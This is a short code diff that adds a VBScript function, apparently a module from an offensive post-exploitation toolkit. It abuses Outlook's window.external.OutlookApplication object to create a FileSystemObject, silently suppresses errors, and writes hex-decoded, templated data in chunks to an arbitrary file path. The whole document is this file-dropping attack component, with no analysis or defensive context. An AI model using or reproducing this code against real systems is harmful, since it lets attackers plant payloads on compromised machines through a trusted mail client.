@@ -1,0 +1,20 @@
+Function upload_file()
+	on error resume next
+	Set fso = window.external.OutlookApplication.CreateObject("Scripting.FileSystemObject")
+	Const ForAppending = 8
+	Set File = fso.OpenTextFile({{destination}}, ForAppending, True)
+	If Err.Number <> 0 Then
+		upload_file = "ERROR: " & Err.Description 
+		Err.Clear
+		exit function
+	End if
+	data = {{data}}
+	start = 1
+	loopnumber = len(data)/2
+	For i = 1 To loopnumber
+		File.write chr("&H" & mid(data,start,2))
+		start = start + 2
+ 	Next
+	File.Close
+    upload_file = "Chunk uploaded successfully"
+End Function
